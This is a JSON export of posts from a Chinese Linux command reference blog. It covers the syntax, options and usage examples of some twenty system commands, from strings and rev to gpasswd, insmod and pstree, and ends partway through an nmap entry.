--encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit @ ：读取中选项 实例 列出 ls 中所有的 ASCII 文本： strings /bin/ls 列出 ls 中所有的 ASCII 文本： cat /bin/ls strings 查找 ls 中包含 libc 的字符串，不区分大小写： strings /bin/ls | grep -i libc ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"strings","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/strings/","stats":{"text":"2 min read","time":75000,"words":315,"minutes":2},"date":"2022-02-01 22:59:19","dateFormat":"2022-02-01"},{"content":"将文件内容以字符为单位反序输出。 补充说明 rev 命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。 语法 rev (参数) 参数 文件：指定要反序显示内容的文件。 实例 [root@localhost ~]# cat iptables.bak # Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013 *filter :INPUT DROP [48113:2690676] :FORWARD accept [0:0] :OUTPUT ACCEPT [3381959:1818595115] -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A OUTPUT -o lo -j ACCEPT COMMIT # Completed on Thu Dec 26 21:25:15 2013 [root@localhost ~]# rev iptables.bak 3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG # retlif* ]6760962:31184[ PORD TUPNI: ]0:0[ TPECCA DRAWROF: ]5115958181:9591833[ TPECCA TUPTUO: TPECCA j- ol i- TUPNI A- TPECCA j- 22 tropd-- pct m- pct p- TUPNI A- TPECCA j- 08 tropd-- pct m- pct p- TUPNI A- TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A- TPECCA j- pmci p- TUPNI A- TPECCA j- ol o- TUPTUO A- TIMMOC 3102 51:52:12 62 ceD uhT no detelpmoC # ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rev","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rev/","stats":{"text":"2 min read","time":85000,"words":268,"minutes":2},"date":"2022-02-01 22:58:46","dateFormat":"2022-02-01"},{"content":"打印文件或修改排队的打印任务。 补充说明 lp 命令用于打印文件，或者修改排队的打印任务。与 lpr 命令类似，lp 命令既支持文件输入也支持标准输入。它与 lpr 的不同之处在于它有一个不同（稍微复杂点）的参数选项设置。 语法 lp (选项) (参数) 选项 -E：与打印服务器连接时强制使用加密； -U：指定连接打印服务器时使用的用户名； -d：指定接收打印任务的目标打印机； -i：指定一个存在的打印任务号； -m：打印完成时发送 E-mail； -n：指定打印的份数； -t：指定打印任务的名称； -H：指定打印任务开始的时间； -P：指定需要打印的页码。 参数 文件：需打印的文件。 实例 要在连接在设备 dlp0 上的打印机 lp0 上打印文件/etc/motd，请输入： lp /etc/motd 要使用文件的一个副本打印/etc/motd文件的 30 个副本，并且要用邮件通知用户作业完成，请输入： lp -c -m -n30 -dlp0:lpd0 /etc/motd 要使用后端标志-f 和-a 并带上作业标题 blah 打印/etc/motd文件，请输入： lp -t &quot;blah&quot; -o -f -o -a /etc/motd 要排队 MyFile 文件并返回作业编号，请输入： lp myfile 要排队 MyFile 文件并禁止作业编号，请输入： lp -s myfile 退出状态 该命令返回以下退出值： 0：所有输入文件成功处理。 0：没有输出设备可用，或者出现一个错误。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lp/","stats":{"text":"2 min read","time":92000,"words":411,"minutes":2},"date":"2022-02-01 22:58:26","dateFormat":"2022-02-01"},{"content":"强大的纯文本编辑器。 补充说明 joe 命令是一款功能强大的纯文本编辑器，拥有众多编写程序和文本的优良特性。 语法 joe (选项) (参数) 选项 -force：强制在最后一行的结尾处加上换行符号； -lines&lt;行数&gt;：设置行数； -lightoff：选取的区块在执行完区块命令后，就会恢复成原来的状态； -autoindent：自动缩排； -backpath：&lt;目录&gt;：指定备份文件的目录； -beep：编辑时，若有错误即发出哔声； -columns&lt;栏位&gt;：设置栏数； -csmode：可执行连续查找模式； -dopadding：是程序跟 tty 间存在缓冲区； -exask：在程序中，执行“Ctrl+k+x”时，会先确认是否要保存文件； -force：强制在最后一行的结尾处加上换行符号； -help：执行程序时一并显示帮助； -keepup：在进入程序后，画面上方为状态列； -marking：在选取区块时，反白区块会随着光标移动； -mid：当光标移出画面时，即自动卷页，使光标回到中央； -nobackups：不建立备份文件； -nonotice：程序执行时，不显示版本信息； -nosta：程序执行时，不显示状态列； -noxon：尝试取消“Ctrl+s”和“Ctrl+q”键的功能； -orphan：若同时开启一个以上的文件，则其他文件会置于独立的缓冲区，而不会另外开启编辑区； -pg&lt;行数&gt;：按“PageUp”或“PageDown”换页时，所要保留前一页的行数； -skiptop&lt;行数&gt;：不使用屏幕上方指定的行数。 参数 文件：指定要编辑的文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"joe","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/joe/","stats":{"text":"2 min read","time":89000,"words":411,"minutes":2},"date":"2022-02-01 22:58:07","dateFormat":"2022-02-01"},{"content":"系统默认的日志守护进程。 补充说明 syslog 是 Linux 系统默认的日志守护进程。默认的 syslog 配置文件是/etc/syslog.conf 文件。程序，守护进程和内核提供了访问系统的日志信息。因此，任何希望生成日志信息的程序都可以向 syslog 接口呼叫生成该信息。 几乎所有的网络设备都可以通过 syslog 协议，将日志信息以用户数据报协议 (UDP) 方式传送到远端服务器，远端接收日志服务器必须通过 syslogd 监听 UDP 端口 514，并根据 syslog.conf 配置文件中的配置处理本机，接收访问系统的日志信息，把指定的事件写入特定文件中，供后台数据库管理和响应之用。意味着可以让任何事件都登录到一台或多台服务器上，以备后台数据库用 off-line(离线) 方法分析远端设备的事件。 通常，syslog 接受来自系统的各种功能的信息，每个信息都包括重要级。/etc/syslog.conf 文件通知 syslogd 如何根据设备和信息重要级别来报告信息。 使用方法 在/var/log 中创建并写入日志信息是由 syslog 协议处理的，是由守护进程 sylogd 负责执行。每个标准的进程都可以用 syslog 记录日志。可以使用 logger 命令通过 syslogd 记录日志。 要向 syslog 文件/var/log/messages 中记录日志信息： logger this is a test log line 输出： tail -n 1 messages Jan 5 10:07:03 localhost root: this is a test log line 如果要记录特定的标记（tag）可以使用： logger -t TAG this is a test log line 输出： tail -n 1 messages Jan 5 10:37:14 localhost TAG: this is a test log line ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"syslog","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/syslog/","stats":{"text":"2 min read","time":105000,"words":457,"minutes":2},"date":"2022-02-01 22:56:13","dateFormat":"2022-02-01"},{"content":"控制系统服务的实用工具。 补充说明 service 命令是 Redhat Linux 兼容的发行版中用来控制系统服务的实用工具，它以启动、停止、重新启动和关闭系统服务，还可以显示所有系统服务的当前状态。 语法 service (选项) (参数) 选项 -h：显示帮助信息； --status-all：显示所服务的状态。 参数 服务名：自动要控制的服务名，即/etc/init.d目录下的脚本文件名； 控制命令：系统服务脚本支持的控制命令。 实例 当修改了主机名、ip 地址等信息时，经常需要把网络重启使之生效。 service network status 配置设备： lo eth0 当前的活跃设备： lo eth0 service network restart 正在关闭接口 eth0： [ 确定 ] 关闭环回接口： [ 确定 ] 设置网络参数： [ 确定 ] 弹出环回接口： [ 确定 ] 弹出界面 eth0: [ 确定 ] 重启 mysql service mysqld status mysqld (pid 1638) 正在运行... service mysqld restart 停止 MySQL： [ 确定 ] 启动 MySQL： [ 确定 ] ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"service","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/service/","stats":{"text":"1 min read","time":58000,"words":260,"minutes":1},"date":"2022-02-01 22:55:26","dateFormat":"2022-02-01"},{"content":"检查并且试图修复文件系统中的错误。 补充说明 fsck 命令被用于检查并且试图修复文件系统中的错误。当文件系统发生错误四化，可用 fsck 指令尝试加以修复。 语法 fsck (选项) (参数) 选项 -a：自动修复文件系统，不询问任何问题； -A：依照/etc/fstab 配置文件的内容，检查文件内所列的全部文件系统； -N：不执行指令，仅列出实际执行会进行的动作； -P：当搭配&quot;-A&quot;参数使用时，则会同时检查所有的文件系统； -r：采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式； -R：当搭配&quot;-A&quot;参数使用时，则会略过/目录的文件系统不予检查； -s：依序执行检查作业，而非同时执行； -t&lt;文件系统类型&gt;：指定要检查的文件系统类型； -T：执行 fsck 指令时，不显示标题信息； -V：显示指令执行过程。 参数 文件系统：指定要查看信息的文件系统。 实例 linux 的文件系统损坏会导致 linux 不正常关机，出错的时候如果系统告诉你是哪一块硬盘的分区有问题，比如是/dev/hda2，接着用如下的命令去对付它： fsck -y /dev/hda2 结束后使用 reboot 命令重启系统这样就好了！ 如果不知道时哪个地方出了问题，可以直接： fsck 在随后的多个确认对话框中输入:y 结束后同样使用 reboot 命令重启系统这样就好了！ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fsck","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fsck/","stats":{"text":"2 min read","time":91000,"words":428,"minutes":2},"date":"2022-02-01 22:55:04","dateFormat":"2022-02-01"},{"content":"显示当前工作目录。。 内建命令 概要 pwd [-LP] 主要用途 显示当前工作目录。 选项 -L （默认值）打印环境变量&quot;$PWD&quot;的值，可能为符号链接。 -P 打印当前工作目录的物理位置。 返回值 返回状态为成功除非给出了非法选项或是当前目录无法读取。 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 外部命令 概要 pwd [OPTION]... 主要用途 显示当前工作目录。 选项 -L, --logical 打印环境变量&quot;$PWD&quot;的值，可能为符号链接。 -P, --physical （默认值）打印当前工作目录的物理位置。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回状态为成功除非给出了非法选项或是当前目录无法读取。 注意 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man pwd或info coreutils 'pwd invocation'。 启动或关闭内建命令请查看enable命令，关于同名优先级的问题请查看builtin命令的例子部分的相关讨论。 在不禁用内建且当前环境没有定义pwd函数的情况下，使用/usr/bin/pwd指向coreutils的pwd，使用pwd指向 bash 内建的pwd。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pwd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pwd/","stats":{"text":"2 min read","time":73000,"words":338,"minutes":2},"date":"2022-02-01 22:52:26","dateFormat":"2022-02-01"},{"content":"查找并显示给定命令的绝对路径。 补充说明 which 命令用于查找并显示给定命令的绝对路径，环境变量 PATH 中保存了查找命令时需要遍历的目录。which 指令会在环境变量$PATH 设置的目录里查找符合条件的文件。也就是说，使用 which 命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。 语法 which (选项) (参数) 选项 -n&lt;文件名长度&gt;：制定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名； -p&lt;文件名长度&gt;：与-n 参数相同，但此处的&lt;文件名长度&gt;包含了文件的路径； -w：指定输出时栏位的宽度； -V：显示版本信息。 参数 指令名：指令名列表。 实例 查找文件、显示命令路径： [root@localhost ~]# which pwd /bin/pwd [root@localhost ~]# which adduser /usr/sbin/adduser 说明：which 是根据使用者所配置的 PATH 变量内的目录去搜寻可运行档的！所以，不同的 PATH 配置内容所找到的命令当然不一样的！ 用 which 去找出 cd [root@localhost ~]# which cd cd: shell built-in command cd 这个常用的命令竟然找不到啊！为什么呢？这是因为 cd 是 bash 内建的命令！ 但是 which 默认是找 PATH 内所规范的目录，所以当然一定找不到的！ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"which","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/which/","stats":{"text":"2 min read","time":83000,"words":376,"minutes":2},"date":"2022-02-01 22:51:57","dateFormat":"2022-02-01"},{"content":"将程序以忽略挂起信号的方式运行起来。 补充说明 nohup 命令可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。 无论是否将 nohup 命令的输出重定向到终端，输出都将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到$HOME/nohup.out文件中。如果没有文件能创建或打开以用于追加，那么 command 参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。 语法 nohup (选项) (参数) 选项 --help：在线帮助； --version：显示版本信息。 参数 程序及选项：要运行的程序及选项。 实例 使用 nohup 命令提交作业，如果使用 nohup 命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为 nohup.out 的文件中，除非另外指定了输出文件： nohup command &gt; myout.file 2&gt;&amp;1 &amp; 在上面的例子中，输出被重定向到 myout.file 文件中。 该指令表示不做挂断操作，后台下载 nohup wget site.com/file.zip 下面命令，会在同一个目录下生成一个名称为 nohup.out 的文件，其中包含了正在运行的程序的输出内容 nohup ping -c 10 baidu.com ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nohup","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nohup/","stats":{"text":"2 min read","time":87000,"words":400,"minutes":2},"date":"2022-02-01 22:51:11","dateFormat":"2022-02-01"},{"content":"用来退出抽取式设备。 补充说明 eject 命令用来退出抽取式设备。若设备已挂入，则 eject 命令会先将该设备卸除再退出。 eject 允许可移动介质（典型是 cd-ROM、软盘、磁带、或者 JAZ 以及 zip 磁盘）在软件控制下弹出。该命令也可以控制一些多盘片 CD-ROM 控制器，控制一些设备支持的自动弹出功能，以及控制一些 CD-ROM 驱动器磁盘托盘的关闭。与 name 相应的设备将被弹出，name 可以为设备文件或者其挂载点，也可以为完整路径或者省略前面的/dev 或者/mnt 设备文件名。如果没有指定 name，缺省使用 cdrom。 有四种不同的弹出的方法，具体要看设备是 CD-ROM， SCSI 设备，可移动软盘，还是磁带而定。默认的弹出会依次尝试所有四种方法，直到成功为止。如果设备当前是挂载上来的，那么在弹出前要先卸载。 语法 eject (选项) (参数) 选项 -a&lt;开关&gt;或--auto&lt;开关&gt;：控制设备的自动退出功能； -c&lt;光驱编号&gt;或--changerslut&lt;光驱编号&gt; 选择光驱柜中的光驱； -d 或--default：显示预设的设备，而不是实际执行动作； -f 或--floppy：退出抽取式磁盘； -h 或--help：显示帮助； -n 或--noop：显示指定的设备； -q 或--tape：退出磁带； -r 或--cdrom：退出光盘； -s 或--scsi：以 SCSI 指令来退出设备； -t 或--trayclose：关闭光盘的托盘； -v 或--verbose：执行时，显示详细的说明。 参数 设备名：指定弹出的设备名称。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"eject","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/eject/","stats":{"text":"2 min read","time":95000,"words":433,"minutes":2},"date":"2022-02-01 22:50:53","dateFormat":"2022-02-01"},{"content":"根据用户给出的信息在当前运行进程中查找并列出符合条件的进程 ID（PID）。 补充说明 pgrep 命令以名称为依据从运行进程队列中查找进程，并显示查找到的进程 id。每一个进程 ID 以一个十进制数表示，通过一个分割字符串和下一个 ID 分开，默认的分割字符串是一个新行。对于每个属性选项，用户可以在命令行上指定一个以逗号分割的可能值的集合。 语法 pgrep (选项) (参数) 选项 -o：仅显示找到的最小（起始）进程号； -n：仅显示找到的最大（结束）进程号； -l：显示进程名称； -P：指定父进程号； -g：指定进程组； -t：指定开启进程的终端； -u：指定进程的有效用户 ID。 参数 进程名称：指定要查找的进程名称，同时也支持类似 grep 指令中的匹配模式。 实例 pgrep -lo httpd 4557 httpd [root@localhost ~]# pgrep -ln httpd 4566 httpd [root@localhost ~]# pgrep -l httpd 4557 httpd 4560 httpd 4561 httpd 4562 httpd 4563 httpd 4564 httpd 4565 httpd 4566 httpd [root@localhost ~]# pgrep httpd 4557 4560 4561 4562 4563 4564 4565 4566 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pgrep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pgrep/","stats":{"text":"2 min read","time":70000,"words":300,"minutes":2},"date":"2022-02-01 22:50:36","dateFormat":"2022-02-01"},{"content":"创建磁盘分区上的“etc2/etc3”文件系统。 补充说明 mke2fs 命令被用于创建磁盘分区上的“etc2/etc3”文件系统。 语法 mke2fs (选项) (参数) 选项 -b&lt;区块大小&gt;：指定区块大小，单位为字节； -c； 检查是否有损坏的区块； -f&lt;不连续区段大小&gt;：指定不连续区段的大小，单位为字节； -F：不管指定的设备为何，强制执行 mke2fs； -i&lt;字节&gt;：指定&quot;字节/inode&quot;的比例； -N&lt;inode 数&gt;：指定要建立的 inode 数目； -l&lt;文件&gt;：从指定的文件中，读取文件西中损坏区块的信息； -L&lt;标签&gt;：设置文件系统的标签名称； -m&lt;百分比值&gt;：指定给管理员保留区块的比例，预设为 5%； -M：记录最后一次挂入的目录； -q：执行时不显示任何信息； -r：指定要建立的 ext2 文件系统版本； -R=&lt;区块数&gt;：设置磁盘阵列参数； -S：仅写入 superblock 与 group descriptors，而不更改 inode able inode bitmap 以及 block bitmap； -v：执行时显示详细信息； -V：显示版本信息。 参数 设备文件：指定要创建的文件系统的分区设备文件名； 块数：指定要创建的文件系统的磁盘块数量。 实例 创建指定的 ext2 文件系统。 mke2fs -q /dev/hda1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mke2fs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mke2fs/","stats":{"text":"2 min read","time":81000,"words":356,"minutes":2},"date":"2022-02-01 22:50:10","dateFormat":"2022-02-01"},{"content":"Linux 下工作组文件的管理工具。 补充说明 gpasswd 命令是 Linux 下工作组文件/etc/group和/etc/gshadow管理工具。 语法 gpasswd (选项) (参数) 选项 -a：添加用户到组； -d：从组删除用户； -A：指定管理员； -M：指定组成员和-A 的用途差不多； -r：删除密码； -R：限制用户登入组，只有组中的成员才可以用 newgrp 加入该组。 参数 组：指定要管理的工作组。 实例 如系统有个 peter 账户，该账户本身不是 groupname 群组的成员，使用 newgrp 需要输入密码即可。 gpasswd groupname 让使用者暂时加入成为该组成员，之后 peter 建立的文件 group 也会是 groupname。所以该方式可以暂时让 peter 建立文件时使用其他的组，而不是 peter 本身所在的组。 所以使用gpasswd groupname设定密码，就是让知道该群组密码的人可以暂时切换具备 groupname 群组功能的。 gpasswd -A peter users 这样 peter 就是 users 群组的管理员，就可以执行下面的操作: gpasswd -a mary users gpasswd -a allen users 注意：添加用户到某一个组 可以使用usermod -G group_name user_name这个命令可以添加一个用户到指定的组，但是以前添加的组就会清空掉。 所以想要添加一个用户到一个组，同时保留以前添加的组时，请使用 gpasswd 这个命令来添加操作用户： gpasswd -a user_name group_name ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gpasswd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gpasswd/","stats":{"text":"2 min read","time":84000,"words":378,"minutes":2},"date":"2022-02-01 22:49:26","dateFormat":"2022-02-01"},{"content":"转换卷组元数据格式。 补充说明 vgconvert 命令用于转换指定 LVM 卷组的元数据格式，通常将“LVM1”格式的卷组转换为“LVM2”格式。转换卷组元数据前必须保证卷组处于非活动状态，否则无法完成转换操作。 语法 vgconvert (选项) (参数) 选项 -M：要转换的卷组格式。 参数 卷组：指定要转换格式的卷组。 实例 转换卷组元数据格式前，使用 vgchange 命令将卷组设置为非活动状态。在命令行中输入下面的命令： [root@localhost lvm]# vgchange -an vg1000 #设置卷组状态为非活动状态 0 logical volume(s) in volume group &quot;vg1000&quot; now active ```shell 使用vgconvert命令将卷组&quot;vg1000&quot;从&quot;LVM1&quot;格式转换为&quot;LVM2&quot;格式。在命令行中输入下面的命令： ```shell [root@localhost lvm]# vgconvert -M2 vg1000 #转换卷组为&quot;LVM2&quot;格式 Volume group vg1000 successfully converted 使用 vgchange 命令将卷组设置为活动状态。在命令行中输入下面的命令： [root@localhost lvm]# vgchange -ay vg1000 #设置卷组状态为活动状态 0 logical volume(s) in volume group &quot;vg1000&quot; now active ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgconvert","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgconvert/","stats":{"text":"2 min read","time":71000,"words":295,"minutes":2},"date":"2022-02-01 22:48:29","dateFormat":"2022-02-01"},{"content":"将给定的模块加载到内核中。 补充说明 insmod 命令用于将给定的模块加载到内核中。Linux 有许多功能是通过模块的方式，在需要时才载入 kernel。如此可使 kernel 较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。 语法 insmod (选项) (参数) 选项 -f：不检查目前 kernel 版本与模块编译时的 kernel 版本是否一致，强制将模块载入； -k：将模块设置为自动卸除； -m：输出模块的载入信息； -o&lt;模块名称&gt;：指定模块的名称，可使用模块文件的文件名； -p：测试模块是否能正确地载入 kernel； -s：将所有信息记录在系统记录文件中； -v：执行时显示详细的信息； -x：不要汇出模块的外部符号； -X：汇出模块所有的外部符号，此为预设置。 参数 内核模块：指定要加载的内核模块文件。 实例 加载 RAID1 阵列级别模块，如下所示： [root@localhost boot]# insmod /lib/modules/2.6. 18-8.el5/kernel/drivers/md/raid1.ko [root@localhost boot]# lsmod | grep raid1 raid1 25153 0 从以上显示结果可知，RAID1 模块已加载成功。只是在使用 insmod 命令加载模块时，需要使用绝对路径方能加载，且加载时无法自动解决依赖关系。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"insmod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/insmod/","stats":{"text":"2 min read","time":81000,"words":365,"minutes":2},"date":"2022-02-01 22:48:08","dateFormat":"2022-02-01"},{"content":"用于验证组文件的完整性。 补充说明 grpck 命令用于验证组文件的完整性，在验证之前，需要先锁定（lock）组文件/etc/group和/etc/shadow。 grpck 命令检查数据是否正确存放，每条记录是否都包含足够的信息，是否有一个唯一的组名，是否包含正确的用户，是否正确设置了组的管理员等。grpck 检查发现错误以后，在命令行提示用户是否删除错误的记录。如果用户没有明确回答删除记录，grpck 终止运行。 语法 grpck (选项) 选项 -r：只读模式； -s：排序组 id。 实例 对组账号和影子文件进行验证： grpck # 必须以管理员身份运行 grpck /etc/group /etc/gshadow # 后面两句一样，如果没有输出信息，则表示没有错误。 测试错误的实例： **echo check_user:x: &gt;&gt; /etc/group # 添加一行错误的格式数据 cat /etc/group | grep check_user** check_user:x: # 这儿GID字段为空，是错误的。 **grpck /etc/group** invalid group file entry delete line 'check_user:x:'? y # 提示是否删除 grpck: the files have been updated # 这时已经删除了错误的行，提示文件已经更新。 **cat /etc/group | grep check_user # 没有查到，已经删除了。** ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"grpck","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/grpck/","stats":{"text":"2 min read","time":74000,"words":321,"minutes":2},"date":"2022-02-01 22:47:50","dateFormat":"2022-02-01"},{"content":"删除消息队列、信号集、或者共享内存标识。 补充说明 ipcrm 命令用来删除一个或更多的消息队列、信号量集或者共享内存标识。 语法 ipcrm [ -m SharedMemoryID ] [ -M SharedMemoryKey ] [ -q MessageID ] [ -Q MessageKey ] [ -s SemaphoreID ] [ -S SemaphoreKey ] 选项 -m SharedMemory id 删除共享内存标识 SharedMemoryID。与 SharedMemoryID 有关联的共享内存段以及数据结构都会在最后一次拆离操作后删除。 -M SharedMemoryKey 删除用关键字 SharedMemoryKey 创建的共享内存标识。与其相关的共享内存段和数据结构段都将在最后一次拆离操作后删除。 -q MessageID 删除消息队列标识 MessageID 和与其相关的消息队列和数据结构。 -Q MessageKey 删除由关键字 MessageKey 创建的消息队列标识和与其相关的消息队列和数据结构。 -s SemaphoreID 删除信号量标识 SemaphoreID 和与其相关的信号量集及数据结构。 -S SemaphoreKey 删除由关键字 SemaphoreKey 创建的信号标识和与其相关的信号量集和数据结构。 msgctl、shmctl 和 semctl 子例程提供了删除操作的细节。标识和关键字可以用 ipcs 命令找到。 示例 如果要删除和 SharedMemoryID 18602 相关的共享内存段，请输入： ipcrm -m 18602 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ipcrm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ipcrm/","stats":{"text":"2 min read","time":73000,"words":328,"minutes":2},"date":"2022-02-01 22:47:24","dateFormat":"2022-02-01"},{"content":"以树状图的方式展现进程之间的派生关系。 补充说明 pstree 命令以树状图的方式展现进程之间的派生关系，显示效果比较直观。 语法 pstree (选项) 选项 -a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示； -c：不使用精简标示法； -G：使用 VT100 终端机的列绘图字符； -h：列出树状图时，特别标明现在执行的程序； -H&lt;程序识别码&gt;：此参数的效果和指定&quot;-h&quot;参数类似，但特别标明指定的程序； -l：采用长列格式显示树状图； -n：用程序识别码排序。预设是以程序名称来排序； -p：显示程序识别码； -u：显示用户名称； -U：使用 UTF-8 列绘图字符； -V：显示版本信息。 实例 显示当前所有进程的进程号和进程 id pstree -p 显示所有进程的所有详细信息，遇到相同的进程名可以压缩显示。 pstree -a 获取 SSH 会话的 PID pstree -p | grep ssh # |-sshd(1221)-+-sshd(2768)---bash(2770)-+-grep(2810) # | `-sshd(2807)---sshd(2808) 从上方的输出中，你可以看到 sshd 进程与分支的树形图。sshd 的主进程是 sshd（1221），另两个分支分别为 sshd（2768） 和 sshd（2807）。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pstree","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pstree/","stats":{"text":"2 min read","time":76000,"words":338,"minutes":2},"date":"2022-02-01 22:46:29","dateFormat":"2022-02-01"},{"content":"显示发行版本信息。 补充说明 LSB 是 Linux Standard Base 的缩写， lsb_release 命令用来显示 LSB 和特定版本的相关信息。如果使用该命令时不带参数，则默认加上-v 参数。 -v 显示版本信息。 -i 显示发行版的id。 -d 显示该发行版的描述信息。 -r 显示当前系统是发行版的具体版本号。 -c 发行版代号。 -a 显示上面的所有信息。 -h 显示帮助信息。 如果当前发行版是 LSB 兼容的，那么/etc/lsb_release文件中会包含 LSB_VERSION 域。这个域的值可以是用冒号隔开的一系列支持的模块。这些模块名是当前版本支持的 LSB 的模块名。如果当前版本不是 LSB 兼容的，就不要包含这个域。 可选的域包括 DISTRIB_ID, DISTRIB_RELEASE, DISTRIB_CODENAME,DISTRIB_DESCRIPTION，它们可以覆盖/etc/distrib-release文件中的内容。注：这里的 distrib 要替换为当前的发行版的名字。如果存在/etc/lsb-release.d目录，会在该目录中查找文件名并作为附加的模块版本加在 LSB_VERSION 前面。文件/etc/distrib-release中包含了一些描述信息，用来说明应该分析哪些文件名。 一般的格式是Distributor release x.x (Codename) 注意：Debian 系统中缺乏相应的描述信息（见/etc/debian-version），为了支持 Debian 系统，大部分信息都被加在了 lsb-release 文件中。 redhat 和 fedora 系统中，还支持一个参数： -s, --short 输出简短的描述信息。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lsb_release","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lsb_release/","stats":{"text":"2 min read","time":87000,"words":392,"minutes":2},"date":"2022-02-01 22:44:57","dateFormat":"2022-02-01"},{"content":"网络探测和安全审核。 补充说明 nmap 命令是一款开放源代码的网络探测和安全审核工具，它的设计目标是快速地扫描大型网络。 语法 nmap (选项) (参数) 选项 -O：激活操作探测； -P0：值进行扫描，不ping主机； -PT：是同TCP的ping； -sV：探测服务版本信息； -sP：ping扫描，仅发现目标主机是否存活； -ps：发送同步（SYN）报文； -PU：发送udp ping； -PE：强制执行直接的ICMPping； -PB：默认模式，可以使用ICMPping和TCPping； -6：使用IPv6地址； -v：得到更多选项信息； -d：增加调试信息地输出； -oN：以人们可阅读的格式输出； -oX：以xml格式向指定文件输出信息； -oM：以机器可阅读的格式输出； -A：使用所有高级扫描选项； --resume：继续上次执行完的扫描； -P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围； 